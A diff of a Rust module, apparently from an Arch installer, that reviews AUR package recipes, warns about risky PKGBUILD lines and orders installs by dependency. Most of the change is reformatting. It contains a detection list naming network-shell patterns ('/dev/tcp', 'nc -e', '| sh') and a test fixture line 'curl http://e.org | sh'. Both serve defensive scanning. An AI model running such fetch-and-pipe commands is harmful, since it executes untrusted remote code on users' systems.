@@ -1,8 +1,8 @@
 //! Reviewing a recipe and planning the install of a set of pinned AUR packages.
 use crate::digest::{tree_digest, Files};
 use crate::srcinfo::{self, dep_name, SrcInfo};
-use pkg::desc::{Dep, Op};
 use crate::Result;
+use pkg::desc::{Dep, Op};
 use std::collections::BTreeMap;
 
 /// Official packages every build needs on the installed system.
@@ -25,13 +25,17 @@ pub struct Review {
 }
 
 fn is_commit(c: &str) -> bool {
-    c.len() == 40 && c.chars().all(|ch| ch.is_ascii_digit() || ('a'..='f').contains(&ch))
+    c.len() == 40
+        && c.chars()
+            .all(|ch| ch.is_ascii_digit() || ('a'..='f').contains(&ch))
 }
 
 /// Checks the files of the recipe at `commit` and prepares the review of the package `name`.
 pub fn review(name: &str, commit: &str, files: Files) -> Result<Review> {
     if !is_commit(commit) {
-        return Err(format!("{commit:?} is not a full 40-digit lower-case commit id"));
+        return Err(format!(
+            "{commit:?} is not a full 40-digit lower-case commit id"
+        ));
     }
     let src = files.get(".SRCINFO").ok_or("the recipe has no .SRCINFO")?;
     if !files.contains_key("PKGBUILD") {
@@ -40,10 +44,18 @@ pub fn review(name: &str, commit: &str, files: Files) -> Result<Review> {
     let info = srcinfo::parse(&String::from_utf8_lossy(src))?;
     if info.package(name).is_none() {
         let have: Vec<&str> = info.packages.iter().map(|p| p.name.as_str()).collect();
-        return Err(format!("{name:?} is not a package of {} (it builds {})", info.base.name, have.join(", ")));
+        return Err(format!(
+            "{name:?} is not a package of {} (it builds {})",
+            info.base.name,
+            have.join(", ")
+        ));
     }
     if !info.arch_ok() {
-        return Err(format!("{} does not build for x86_64 (arch = {})", info.base.name, info.base.get("arch").join(" ")));
+        return Err(format!(
+            "{} does not build for x86_64 (arch = {})",
+            info.base.name,
+            info.base.get("arch").join(" ")
+        ));
     }
     let mut warnings = Vec::new();
     let vcs = info.vcs_sources();
@@ -52,24 +64,59 @@ pub fn review(name: &str, commit: &str, files: Files) -> Result<Review> {
     }
     let skipped = info.skipped_checksums();
     if skipped > 0 {
-        warnings.push(format!("{skipped} source file(s) are not checksummed (SKIP)"));
+        warnings.push(format!(
+            "{skipped} source file(s) are not checksummed (SKIP)"
+        ));
     }
     if !info.install_files().is_empty() {
-        warnings.push(format!("has an install script ({}): it runs as root when the package is installed", info.install_files().join(", ")));
+        warnings.push(format!(
+            "has an install script ({}): it runs as root when the package is installed",
+            info.install_files().join(", ")
+        ));
     }
     if !info.base.get("validpgpkeys").is_empty() {
         warnings.push("sources are signed; makepkg checks the signatures and needs the keys (validpgpkeys) in its keyring, otherwise the build fails".into());
     }
     let risky = risky_lines(&files);
     if !risky.is_empty() {
-        warnings.push(format!("{} line(s) look risky (network access, eval, sudo, ...), see the highlighted lines", risky.len()));
+        warnings.push(format!(
+            "{} line(s) look risky (network access, eval, sudo, ...), see the highlighted lines",
+            risky.len()
+        ));
     }
-    Ok(Review { name: name.into(), pkgbase: info.base.name.clone(), commit: commit.into(), tree_sha256: tree_digest(&files), srcinfo: info, files, vcs: !vcs.is_empty(), warnings })
+    Ok(Review {
+        name: name.into(),
+        pkgbase: info.base.name.clone(),
+        commit: commit.into(),
+        tree_sha256: tree_digest(&files),
+        srcinfo: info,
+        files,
+        vcs: !vcs.is_empty(),
+        warnings,
+    })
 }
 
 /// Lines of the PKGBUILD and install scripts that deserve a second look: `(file, line number, text)`.
 pub fn risky_lines(files: &Files) -> Vec<(String, usize, String)> {
-    const PATTERNS: &[&str] = &["curl ", "wget ", "sudo ", "eval ", "base64", "| sh", "| bash", "|sh", "|bash", "chmod 777", "chmod -R 777", "/dev/tcp", "nc -e", "systemctl enable", "useradd", "usermod", "crontab"];
+    const PATTERNS: &[&str] = &[
+        "curl ",
+        "wget ",
+        "sudo ",
+        "eval ",
+        "base64",
+        "| sh",
+        "| bash",
+        "|sh",
+        "|bash",
+        "chmod 777",
+        "chmod -R 777",
+        "/dev/tcp",
+        "nc -e",
+        "systemctl enable",
+        "useradd",
+        "usermod",
+        "crontab",
+    ];
     let mut out = Vec::new();
     for (path, data) in files {
         if path != "PKGBUILD" && !path.ends_with(".install") {
@@ -130,14 +177,24 @@ impl Official {
         for p in dbs.iter().flat_map(|d| d.packages.iter()) {
             let e = by_name.entry(p.name.clone()).or_default();
             if e.is_empty() {
-                e.push(Entry { provider: p.name.clone(), have: Have::Version(p.version.clone()) });
+                e.push(Entry {
+                    provider: p.name.clone(),
+                    have: Have::Version(p.version.clone()),
+                });
             }
         }
         // Real names win over `provides`, so a second pass.
         for p in dbs.iter().flat_map(|d| d.packages.iter()) {
             for pr in &p.provides {
-                let have = if pr.op == Op::Eq { Have::Version(pr.version.clone()) } else { Have::Unversioned };
-                by_name.entry(pr.name.clone()).or_default().push(Entry { provider: p.name.clone(), have });
+                let have = if pr.op == Op::Eq {
+                    Have::Version(pr.version.clone())
+                } else {
+                    Have::Unversioned
+                };
+                by_name.entry(pr.name.clone()).or_default().push(Entry {
+                    provider: p.name.clone(),
+                    have,
+                });
             }
         }
         Official { by_name }
@@ -145,14 +202,31 @@ impl Official {
 
     /// For tests and for callers without databases (versions are not known, so constraints are not checked).
     pub fn from_names(names: &[&str]) -> Official {
-        Official { by_name: names.iter().map(|n| (n.to_string(), vec![Entry { provider: n.to_string(), have: Have::Unknown }])).collect() }
+        Official {
+            by_name: names
+                .iter()
+                .map(|n| {
+                    (
+                        n.to_string(),
+                        vec![Entry {
+                            provider: n.to_string(),
+                            have: Have::Unknown,
+                        }],
+                    )
+                })
+                .collect(),
+        }
     }
 
     /// The package that satisfies the dependency `dep`, constraint included (`go>=1.24` needs a `go` that is
     /// at least that new, or a package providing `go=1.24` or newer).
     pub fn provider(&self, dep: &str) -> Option<&str> {
         let d = parse_dep(dep);
-        self.by_name.get(&d.name)?.iter().find(|e| accepts(&d, &e.have)).map(|e| e.provider.as_str())
+        self.by_name
+            .get(&d.name)?
+            .iter()
+            .find(|e| accepts(&d, &e.have))
+            .map(|e| e.provider.as_str())
     }
 }
 
@@ -162,14 +236,30 @@ fn aur_provides(r: &Review, dep: &str) -> bool {
     let version = r.srcinfo.version();
     let provides = |x: &String| {
         let pr = Dep::parse(x);
-        pr.name == d.name && accepts(&d, &if pr.op == Op::Eq { Have::Version(pr.version) } else { Have::Unversioned })
+        pr.name == d.name
+            && accepts(
+                &d,
+                &if pr.op == Op::Eq {
+                    Have::Version(pr.version)
+                } else {
+                    Have::Unversioned
+                },
+            )
     };
-    r.srcinfo.packages.iter().any(|p| (p.name == d.name && accepts(&d, &Have::Version(version.clone()))) || p.get("provides").iter().any(provides)) || r.srcinfo.base.get("provides").iter().any(provides)
+    r.srcinfo.packages.iter().any(|p| {
+        (p.name == d.name && accepts(&d, &Have::Version(version.clone())))
+            || p.get("provides").iter().any(provides)
+    }) || r.srcinfo.base.get("provides").iter().any(provides)
 }
 
 /// All dependencies of a review, with whether only the build needs them.
 fn all_deps(r: &Review) -> Vec<(String, bool)> {
-    let mut v: Vec<(String, bool)> = r.srcinfo.depends(&r.name).into_iter().map(|d| (d, false)).collect();
+    let mut v: Vec<(String, bool)> = r
+        .srcinfo
+        .depends(&r.name)
+        .into_iter()
+        .map(|d| (d, false))
+        .collect();
     v.extend(r.srcinfo.makedepends().into_iter().map(|d| (d, true)));
     v
 }
@@ -181,7 +271,12 @@ pub fn unresolved(reviews: &[Review], official: &Official) -> Vec<(String, Strin
     let mut out = Vec::new();
     for r in reviews {
         for (d, _) in all_deps(r) {
-            if official.provider(&d).is_none() && !reviews.iter().any(|o| o.name != r.name && aur_provides(o, &d)) && !out.contains(&(r.name.clone(), d.clone())) {
+            if official.provider(&d).is_none()
+                && !reviews
+                    .iter()
+                    .any(|o| o.name != r.name && aur_provides(o, &d))
+                && !out.contains(&(r.name.clone(), d.clone()))
+            {
                 out.push((r.name.clone(), d));
             }
         }
@@ -192,7 +287,11 @@ pub fn unresolved(reviews: &[Review], official: &Official) -> Vec<(String, Strin
 /// The ordered install plan. `explicit` are the packages the user asked for (each must have a review); a
 /// package that another one in the set needs is installed as a dependency. Dependencies come before the
 /// packages that need them.
-pub fn plan(reviews: &[Review], explicit: &[String], official: &Official) -> Result<Vec<config::AurPackage>> {
+pub fn plan(
+    reviews: &[Review],
+    explicit: &[String],
+    official: &Official,
+) -> Result<Vec<config::AurPackage>> {
     for e in explicit {
         if !reviews.iter().any(|r| &r.name == e) {
             return Err(format!("{e} has not been reviewed and pinned"));
@@ -205,10 +304,21 @@ pub fn plan(reviews: &[Review], explicit: &[String], official: &Official) -> Res
     // Order: dependencies first, in the order the user listed things otherwise; a cycle is an error.
     let mut order: Vec<usize> = Vec::new();
     let mut state = vec![0u8; reviews.len()]; // 0 new, 1 visiting, 2 done
-    fn visit(i: usize, reviews: &[Review], official: &Official, state: &mut Vec<u8>, order: &mut Vec<usize>) -> Result<()> {
+    fn visit(
+        i: usize,
+        reviews: &[Review],
+        official: &Official,
+        state: &mut Vec<u8>,
+        order: &mut Vec<usize>,
+    ) -> Result<()> {
         match state[i] {
             2 => return Ok(()),
-            1 => return Err(format!("{} is part of a dependency cycle between AUR packages", reviews[i].name)),
+            1 => {
+                return Err(format!(
+                    "{} is part of a dependency cycle between AUR packages",
+                    reviews[i].name
+                ))
+            }
             _ => {}
         }
         state[i] = 1;
@@ -232,17 +342,20 @@ pub fn plan(reviews: &[Review], explicit: &[String], official: &Official) -> Res
         let r = &reviews[i];
         let mut deps: Vec<String> = Vec::new();
         let mut build: Vec<String> = Vec::new();
-        let add = |name: &str, build_only: bool, deps: &mut Vec<String>, build: &mut Vec<String>| {
-            if !deps.iter().any(|x| x == name) {
-                deps.push(name.to_string());
-            }
-            if build_only && !build.iter().any(|x| x == name) {
-                build.push(name.to_string());
-            }
-        };
+        let add =
+            |name: &str, build_only: bool, deps: &mut Vec<String>, build: &mut Vec<String>| {
+                if !deps.iter().any(|x| x == name) {
+                    deps.push(name.to_string());
+                }
+                if build_only && !build.iter().any(|x| x == name) {
+                    build.push(name.to_string());
+                }
+            };
         for t in BUILD_TOOLS {
             if official.provider(t).is_none() {
-                return Err(format!("the official repositories have no {t}, which every AUR build needs"));
+                return Err(format!(
+                    "the official repositories have no {t}, which every AUR build needs"
+                ));
             }
             add(t, true, &mut deps, &mut build);
         }
@@ -252,9 +365,19 @@ pub fn plan(reviews: &[Review], explicit: &[String], official: &Official) -> Res
             }
         }
         // A package that is also needed at run time is not a build-only one.
-        let runtime: Vec<String> = r.srcinfo.depends(&r.name).iter().filter_map(|d| official.provider(d).map(String::from)).collect();
+        let runtime: Vec<String> = r
+            .srcinfo
+            .depends(&r.name)
+            .iter()
+            .filter_map(|d| official.provider(d).map(String::from))
+            .collect();
         build.retain(|b| !runtime.contains(b));
-        let needed_by_other = reviews.iter().any(|o| o.name != r.name && all_deps(o).iter().any(|(d, _)| aur_provides(r, d) && official.provider(d).is_none()));
+        let needed_by_other = reviews.iter().any(|o| {
+            o.name != r.name
+                && all_deps(o)
+                    .iter()
+                    .any(|(d, _)| aur_provides(r, d) && official.provider(d).is_none())
+        });
         out.push(config::AurPackage {
             name: r.name.clone(),
             pkgbase: r.pkgbase.clone(),
@@ -293,27 +416,57 @@ mod tests {
     #[test]
     fn review_checks_and_warns() {
         let c = "a".repeat(40);
-        assert!(review("x", "master", files("", "")).unwrap_err().contains("40-digit"));
-        assert!(review("x", &c, Files::new()).unwrap_err().contains(".SRCINFO"));
+        assert!(review("x", "master", files("", ""))
+            .unwrap_err()
+            .contains("40-digit"));
+        assert!(review("x", &c, Files::new())
+            .unwrap_err()
+            .contains(".SRCINFO"));
         let s = "pkgbase = x\n\tpkgver = 1\n\tpkgrel = 1\n\tarch = aarch64\npkgname = x\n";
-        assert!(review("x", &c, files(s, "")).unwrap_err().contains("x86_64"));
+        assert!(review("x", &c, files(s, ""))
+            .unwrap_err()
+            .contains("x86_64"));
         let s = "pkgbase = x\n\tpkgver = 1\n\tpkgrel = 1\n\tarch = x86_64\n\tinstall = x.install\n\tsource = git+https://e.org/x.git\n\tsource = a.tar.gz\n\tsha256sums = SKIP\n\tsha256sums = SKIP\npkgname = x\n";
-        let r = review("x", &c, files(s, "curl http://e.org | sh\n# curl in a comment\n")).unwrap();
+        let r = review(
+            "x",
+            &c,
+            files(s, "curl http://e.org | sh\n# curl in a comment\n"),
+        )
+        .unwrap();
         assert!(r.vcs);
         assert_eq!(r.warnings.len(), 4, "{:?}", r.warnings);
-        assert_eq!(risky_lines(&r.files), [("PKGBUILD".to_string(), 1, "curl http://e.org | sh".to_string())]);
-        assert!(review("other", &c, files(s, "")).unwrap_err().contains("not a package"));
+        assert_eq!(
+            risky_lines(&r.files),
+            [(
+                "PKGBUILD".to_string(),
+                1,
+                "curl http://e.org | sh".to_string()
+            )]
+        );
+        assert!(review("other", &c, files(s, ""))
+            .unwrap_err()
+            .contains("not a package"));
     }
 
     #[test]
     fn plan_adds_official_deps_and_build_tools() {
-        let r = rev("zen", "\tdepends = gtk3\n\tmakedepends = go>=1.24\n\tmakedepends = gtk3\n");
+        let r = rev(
+            "zen",
+            "\tdepends = gtk3\n\tmakedepends = go>=1.24\n\tmakedepends = gtk3\n",
+        );
         let p = plan(&[r], &["zen".into()], &official()).unwrap();
         assert_eq!(p.len(), 1);
         assert_eq!(p[0].deps, ["base-devel", "git", "gtk3", "go"]);
-        assert_eq!(p[0].build_deps, ["base-devel", "git", "go"], "gtk3 is also needed at run time");
+        assert_eq!(
+            p[0].build_deps,
+            ["base-devel", "git", "go"],
+            "gtk3 is also needed at run time"
+        );
         assert!(!p[0].as_dep);
-        let mut c = config::Config { aur: p, ..empty_config() };
+        let mut c = config::Config {
+            aur: p,
+            ..empty_config()
+        };
         c.services = vec!["NetworkManager.service".into()];
         c.validate().unwrap();
     }
@@ -324,7 +477,12 @@ mod tests {
             timezone: "UTC".into(),
             locale: "en_US.UTF-8".into(),
             keymap: "us".into(),
-            disk: config::Disk { model: None, confirm_serial: "S".into(), auto_largest: false, esp_mib: 512 },
+            disk: config::Disk {
+                model: None,
+                confirm_serial: "S".into(),
+                auto_largest: false,
+                esp_mib: 512,
+            },
             mirrors: vec!["https://e.org/$repo/os/$arch".into()],
             packages: vec!["base".into()],
             providers: vec![],
@@ -336,6 +494,7 @@ mod tests {
             user_archives: vec![],
             dry_run: false,
             scripts: vec![],
+            custom_services: vec![],
             aur: vec![],
         }
     }
@@ -345,30 +504,54 @@ mod tests {
         let top = rev("top", "\tdepends = lib-aur\n\tdepends = glibc\n");
         let lib = rev("lib-aur", "\tprovides = libx\n");
         let p = plan(&[top, lib], &["top".into()], &official()).unwrap();
-        assert_eq!(p.iter().map(|x| x.name.as_str()).collect::<Vec<_>>(), ["lib-aur", "top"]);
+        assert_eq!(
+            p.iter().map(|x| x.name.as_str()).collect::<Vec<_>>(),
+            ["lib-aur", "top"]
+        );
         assert!(p[0].as_dep && !p[1].as_dep);
         // Through `provides`.
         let top = rev("top", "\tdepends = libx\n");
         let lib = rev("lib-aur", "\tprovides = libx\n");
-        assert_eq!(plan(&[top, lib], &["top".into()], &official()).unwrap().len(), 2);
+        assert_eq!(
+            plan(&[top, lib], &["top".into()], &official())
+                .unwrap()
+                .len(),
+            2
+        );
     }
 
     #[test]
     fn plan_errors_are_specific() {
         let top = rev("top", "\tdepends = nowhere\n");
-        assert_eq!(unresolved(&[top.clone()], &official()), [("top".to_string(), "nowhere".to_string())]);
-        assert!(plan(&[top.clone()], &["top".into()], &official()).unwrap_err().contains("nowhere"));
-        assert!(plan(&[], &["top".into()], &official()).unwrap_err().contains("not been reviewed"));
+        assert_eq!(
+            unresolved(&[top.clone()], &official()),
+            [("top".to_string(), "nowhere".to_string())]
+        );
+        assert!(plan(&[top.clone()], &["top".into()], &official())
+            .unwrap_err()
+            .contains("nowhere"));
+        assert!(plan(&[], &["top".into()], &official())
+            .unwrap_err()
+            .contains("not been reviewed"));
         let a = rev("a", "\tdepends = b\n");
         let b = rev("b", "\tdepends = a\n");
-        assert!(plan(&[a, b], &["a".into()], &official()).unwrap_err().contains("cycle"));
-        assert!(plan(&[rev("x", "")], &["x".into()], &Official::from_names(&["git"])).unwrap_err().contains("base-devel"));
+        assert!(plan(&[a, b], &["a".into()], &official())
+            .unwrap_err()
+            .contains("cycle"));
+        assert!(plan(
+            &[rev("x", "")],
+            &["x".into()],
+            &Official::from_names(&["git"])
+        )
+        .unwrap_err()
+        .contains("base-devel"));
     }
 
     #[test]
     fn official_prefers_real_names_over_provides() {
         let mk = |name: &str, provides: &[&str]| {
-            let mut d = format!("%NAME%\n{name}\n\n%VERSION%\n1-1\n\n%FILENAME%\n{name}.pkg.tar.zst\n\n");
+            let mut d =
+                format!("%NAME%\n{name}\n\n%VERSION%\n1-1\n\n%FILENAME%\n{name}.pkg.tar.zst\n\n");
             if !provides.is_empty() {
                 d.push_str("%PROVIDES%\n");
                 for p in provides {
@@ -377,7 +560,10 @@ mod tests {
             }
             pkg::desc::Package::parse("core", &d).unwrap()
         };
-        let mut db = pkg::db::Db { name: "core".into(), packages: vec![mk("a", &["ttf-font"]), mk("ttf-font", &[])] };
+        let mut db = pkg::db::Db {
+            name: "core".into(),
+            packages: vec![mk("a", &["ttf-font"]), mk("ttf-font", &[])],
+        };
         db.name = "core".into();
         let o = Official::new(&[db]);
         assert_eq!(o.provider("ttf-font"), Some("ttf-font"));
@@ -388,7 +574,9 @@ mod tests {
         let packages = pkgs
             .iter()
             .map(|(name, version, provides)| {
-                let mut d = format!("%NAME%\n{name}\n\n%VERSION%\n{version}\n\n%FILENAME%\n{name}.pkg.tar.zst\n\n");
+                let mut d = format!(
+                    "%NAME%\n{name}\n\n%VERSION%\n{version}\n\n%FILENAME%\n{name}.pkg.tar.zst\n\n"
+                );
                 if !provides.is_empty() {
                     d.push_str("%PROVIDES%\n");
                     for p in *provides {
@@ -398,12 +586,19 @@ mod tests {
                 pkg::desc::Package::parse("core", &d).unwrap()
             })
             .collect();
-        Official::new(&[pkg::db::Db { name: "core".into(), packages }])
+        Official::new(&[pkg::db::Db {
+            name: "core".into(),
+            packages,
+        }])
     }
 
     #[test]
     fn official_checks_version_constraints() {
-        let o = official_with(&[("go", "2:1.23.4-1", &[]), ("gcc-go", "14.2-1", &["go=1.24"]), ("libfoo", "6-1", &["libfoo.so=6-64", "libbar"])]);
+        let o = official_with(&[
+            ("go", "2:1.23.4-1", &[]),
+            ("gcc-go", "14.2-1", &["go=1.24"]),
+            ("libfoo", "6-1", &["libfoo.so=6-64", "libbar"]),
+        ]);
         assert_eq!(o.provider("go"), Some("go"));
         assert_eq!(o.provider("go>=1.20"), Some("go"));
         // The epoch counts: 2:1.23.4 is newer than 1.30.
@@ -425,10 +620,19 @@ mod tests {
 
     #[test]
     fn unmet_constraints_are_unresolved() {
-        let o = official_with(&[("base-devel", "1-1", &[]), ("git", "2-1", &[]), ("foo", "1.0-1", &[])]);
+        let o = official_with(&[
+            ("base-devel", "1-1", &[]),
+            ("git", "2-1", &[]),
+            ("foo", "1.0-1", &[]),
+        ]);
         let top = rev("top", "\tdepends = foo>=2\n");
-        assert_eq!(unresolved(&[top.clone()], &o), [("top".to_string(), "foo>=2".to_string())]);
-        assert!(plan(&[top], &["top".into()], &o).unwrap_err().contains("foo>=2"));
+        assert_eq!(
+            unresolved(&[top.clone()], &o),
+            [("top".to_string(), "foo>=2".to_string())]
+        );
+        assert!(plan(&[top], &["top".into()], &o)
+            .unwrap_err()
+            .contains("foo>=2"));
         assert!(unresolved(&[rev("top", "\tdepends = foo>=1\n")], &o).is_empty());
         // Another reviewed AUR package must be new enough too (the helper's version is 1-1).
         let lib = rev("foo2", "\tprovides = libx=1\n");
